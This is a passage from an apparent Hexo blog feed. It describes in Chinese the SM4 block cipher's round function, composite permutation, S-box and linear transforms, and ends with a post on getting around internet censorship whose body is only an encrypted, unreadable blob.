style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span>完全类似.</p><h5 id="非线性变换-tau">非线性变换<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>τ</mi></mrow><annotation encoding="application/x-tex">\tau</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span></span></span></span></h5><p>非线性变换<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>τ</mi></mrow><annotation encoding="application/x-tex">\tau</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span></span></span></span>与加密过程中的完全相同</p><h5 id="线性变换l">线性变换<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>L</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup></mrow><annotation encoding="application/x-tex">L^{&#x27;}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.94248em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.94248em;"><span style="top:-2.94248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></h5><p>线性变换<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>L</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup></mrow><annotation encoding="application/x-tex">L^{&#x27;}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.94248em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.94248em;"><span style="top:-2.94248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>略有不同:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>L</mi><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msup><mo stretchy="false">(</mo><mi>B</mi><mo stretchy="false">)</mo><mo>=</mo><mi>B</mi><mo>⊕</mo><mo stretchy="false">(</mo><mi>B</mi><mo>&lt;</mo><mo>&lt;</mo><mo>&lt;</mo><mn>13</mn><mo stretchy="false">)</mo><mo>⊕</mo><mo stretchy="false">(</mo><mi>B</mi><mo>&lt;</mo><mo>&lt;</mo><mo>&lt;</mo><mn>23</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L^{&#x27;}(B) = B \oplus (B&lt;&lt;&lt;13) \oplus (B&lt;&lt;&lt;23)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.24248em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.99248em;"><span style="top:-2.99248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">3</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">3</span><span class="mclose">)</span></span></span></span></span></p><p>32个固定参数CK为(后缀h代表16进制数):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240115125211392.png" alt="image-20240115125211392" style="zoom:50%;" /><h2 id="轮函数f">轮函数F</h2><h3 id="f函数定义">F函数定义</h3><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>X</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>X</mi><mrow><mi>i</mi><mo>+</mo><mn>2</mn></mrow></msub><mo separator="true">,</mo><msub><mi>X</mi><mrow><mi>i</mi><mo>+</mo><mn>3</mn></mrow></msub><mo separator="true">,</mo><mi>r</mi><msub><mi>k</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>X</mi><mi>i</mi></msub><mo>⊕</mo><mi>T</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>⊕</mo><msub><mi>X</mi><mrow><mi>i</mi><mo>+</mo><mn>2</mn></mrow></msub><mo>⊕</mo><msub><mi>X</mi><mrow><mi>i</mi><mo>+</mo><mn>3</mn></mrow></msub><mo>⊕</mo><mi>r</mi><msub><mi>k</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i) = X_i \oplus T(X_{i+1} \oplus X_{i+2} \oplus X_{i+3} \oplus rk_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>其中T()为<code>合成置换</code>.</p><h3 id="合成置换t">合成置换T</h3><p>合成置换T接受1字的输入A,得到1字的输出C.包含非线性变换<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>τ</mi></mrow><annotation encoding="application/x-tex">\tau</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span></span></span></span>和线性变换<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">L</span></span></span></span>两部分.</p><h4 id="非线性变换-tau">非线性变换<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>τ</mi></mrow><annotation encoding="application/x-tex">\tau</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span></span></span></span></h4><p>非线性变换即对入参A(1字/4byte)进行<code>S盒变换</code>,输出结果B(1字/4byte).S盒如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240115121103438.png" alt="image-20240115121103438" style="zoom:50%;" /><p>对于输入的每个字节,使用其16进制表示,高位(即二进制高4位)作为行坐标,低位(即二进制低4位)作为列坐标,替换为S盒中对应值.</p><h4 id="线性变换l">线性变换<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">L</span></span></span></span></h4><p>线性变换<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">L</span></span></span></span>使用循环左移(使用&lt;&lt;&lt;符号代表)和异或,公式如下:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><mi>L</mi><mo stretchy="false">(</mo><mi>B</mi><mo stretchy="false">)</mo><mo>=</mo><mi>B</mi><mo>⊕</mo><mo stretchy="false">(</mo><mi>B</mi><mo>&lt;</mo><mo>&lt;</mo><mo>&lt;</mo><mn>2</mn><mo stretchy="false">)</mo><mo>⊕</mo><mo stretchy="false">(</mo><mi>B</mi><mo>&lt;</mo><mo>&lt;</mo><mo>&lt;</mo><mn>10</mn><mo stretchy="false">)</mo><mo>⊕</mo><mo stretchy="false">(</mo><mi>B</mi><mo>&lt;</mo><mo>&lt;</mo><mo>&lt;</mo><mn>18</mn><mo stretchy="false">)</mo><mo>⊕</mo><mi>B</mi><mo stretchy="false">(</mo><mo>&lt;</mo><mo>&lt;</mo><mo>&lt;</mo><mn>24</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C = L(B) = B \oplus (B&lt;&lt;&lt;2) \oplus (B&lt;&lt;&lt;10) \oplus (B&lt;&lt;&lt;18) \oplus B(&lt;&lt;&lt;24)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mopen">(</span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">4</span><span class="mclose">)</span></span></span></span></span></p><p>经过非线性变换<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>τ</mi></mrow><annotation encoding="application/x-tex">\tau</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span></span></span></span>和线性变换<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">L</span></span></span></span>,即完成一次合成置换T.</p>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何科学上网</title>
      <link href="/2024cb42ed54b65f/"/>
      <url>/2024cb42ed54b65f/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="60e6c14dce6b46ff881b904dde1b4725eedbbfb53572e06c1541dc4c5707f7ff">fae812e993397cd0235575e8d2b2ed7b1bc506860f58ac79586e026912d38f46ea384ed381d6c3371a15bec7267415840f67dfa2d11283725daf60b6196790e6f9811e91b379e33a2e0fd004444ae59bdb0aa9dbac840dbf4cd5a75cd6bb0af8a718b55e904ee2b7b5b87fe4d5533c256c7726c032e15f0c93f35d1b61de382b1c78a36dfcc97c61eee9b07bca10a36882dd0dd75dac26209531f5bcaa52bc0f884af237ff1f1fbd05713c5fc8d05ac6657b4e3f6d96480c000811596b6b2b4e7a1983317b61f61cf1cee1d487d496fb529a110ae160b5e3c309477e96d06de71912aa8789e85d609ca4ecf36f43bb0599b748679fab9b15e4dc36b5f304b29072a4ac4a8b7a44f1d30df9dc6754d114de7e05b3f0e854b3177e68daeb054bc2f4fece70b9f5b2ab3d7a969d4fdf3c2fe50a004597aeae3fecadc3b53def4eb72f18b12625e458b47a07f6bcaf9746d4f107ed6986e85f9b98bd6edd294a46dfba257f5b8f9b1806d77854cd49d4385552679b448c410a5d170c37b4e0e7ea076ef094733317f93697e9c16808fa4636ab561e6515f9171f493b4985cb5d3086af67b022107a7f7a255f476279a2cea668b0db3b357e0baf7935586bf35408ce76336ba7e1ddbd1393be5be5cede4e62568aef8a2bd9724551639d004efa47c73fe8b9063d2ac9acda5eb90bdd41d3b2bc0cadf8d6b2cc9908cd6cf2f55a358284a912cb6f7fe719a46cb3b27cdc2523051efc97a18038c6245c8473ed1841ad30bd8a8cf41ddca59786f7df9e604de1c20128bdfe045f5fac85d40cd0e6a8ff96cab0bef80864d02b0acff29f18d7d46a2b01951cdaeb60d4db37c15298363ca66fba637b924efe569b3c2a1cbb3d6cba582a14119a71f805a9ffaa87ed86e897006823d912e0e6bed3d9834966b66757e0d73d50d0128a22cb7a2ce962748f3799db1f7d8d71dc6edf420db9999aa24d8a401715089b05ea3ad63b9a8052f5550f02648d01a97538957edd96e36ae5ac90e614fc1367f9ed17a679ffccbc9063fc9d224029ef8b20d43a182d61098b38c744116aaf55b565a166d908f3ccc0fc81dd4f63d6ef524879ed67ebf685d6c0ab1b67d393a1a62b44a4f2358806bd38ea038a13807700b2ae06a48bde19d12b1af27dc4ed5b9778d9d97c8134c8808be64160d64305fa667b3823c7c99ffae7f4fe4555587b2c81e0c69ca1eddf71d0474ecb9a3832230baa62c9a1a040526a012ac083494b5acfac6dbf12885a62e63d60436072f996b1aee45c854c802e88f772f2d9e618c60ac3fe86c2395afc2dc2e5d8722c050ee6f11d18a4b034a2e9b2fa2faa0283bfc2599786553d6028ca28433057e31e822d6a7e01915f86b30a58a5c2f8a327fd84810ae931a2a93718432d7e0086b04b34616f4743419b3c8439cdf154e82d9ec244d8555209cc8dfd3897a95a1eb4bc9154cb42af618a8872a33af80f2bb2af98b0782feed34712f1f26836604c029b58660c1f5edbef19485a9f5963006a935d3f1308f38d7e1d0c9aeff24dab31ebb3a147e9809c332d7930f7b37baf0a4c7b394b99415e18ac6c9d698dcdfd3666590eec028c55134dfa106f46abe5953ecbcd737121489ad49241f82b4a9ee0f16d97075e64125db61427991e44ea4f752a5cd9b5001383c4a09e3a168f38d0e56ae6782492aaffadf38f64c50dd06bb736b109b9e622254e8915c4cfb7190a04bd6babd63aaf3a0de664c1a29c88ae981b92521b55df2b089f5ddd48bb5885c95533272271375f8ee0510cf6d92e93a6da7882a016f35213e227aab85c66dc5ffb390ecde9690db3165f463b7d910b771b5a1caa509dd4ddbfae2d364baece71694a7d5d14afa40b7b6f879a956dfe93c25565a8b70ca978eef045da9865f621d3996c62ad95572f61a92de4f3e743b2e0b076ec23ee0283e8d5aff1a3ca32bd026817e52b55a385871ef77c4aef7c201c38808729114061e0bb480c0ae047d486dc45b7ffbbe6e26b6f448bed5d627daac49a1e75cfd463bdb9bd053bd2729099edac351ce18e9c1d0295b132c8467af5b02a584404c2d1c6dce0b090fcd7d2f386308f5dea0a4c7187a2f2a9233b6693ae1a004b0bd28b5b7206f1b705ad730f57a3a88966db7eb0fdcba681875fe9f5367d4834457ceee1e27298c06ff1e4d9f4a1d95974869442492c8a9ebc7d080116051b81a9b53bdab9e090fbd63a067d23d39c830b86e5843a01b994c889da7e1514ede22f6657b4049ae2ea8e159b8d9b0ad3e7d0c44d0455ef6b3a0fb03b2b1d1550e19b4f6734abfd0cc96e1685a6c7c637fafa99b3147f90044cbe1e7f27f95723ac4295c22ab30f4b178e51ca83a84ea4a9ef665568ee25c0685945407ded3b5e4855a53407e21836cbbc312964483ba55c704f4353bcc4dbfbe3ae97c50569aa933d4590d95abeeaa65744dfcf7cc40d3d7ec1f475e7a57d2e0a993a408cbfd20846533511f1e37bdd875b016ef0b2a50a1fe0d634e28aed05c29586b2de398fb8fd1af64c4b727bab9e064272f31b1aa6b5384fc7db0ba0b8658acfaf3a43033236f48596b10d5da8f35b06a1854aef20aed204e6385ed3ef3398ef152961a0b1322527c05225587ef88a0c81d43d7aeeb058b7b486cffeb6ff49bb054cf0a77b93c2836dd252da77a07113eae198d1f4e1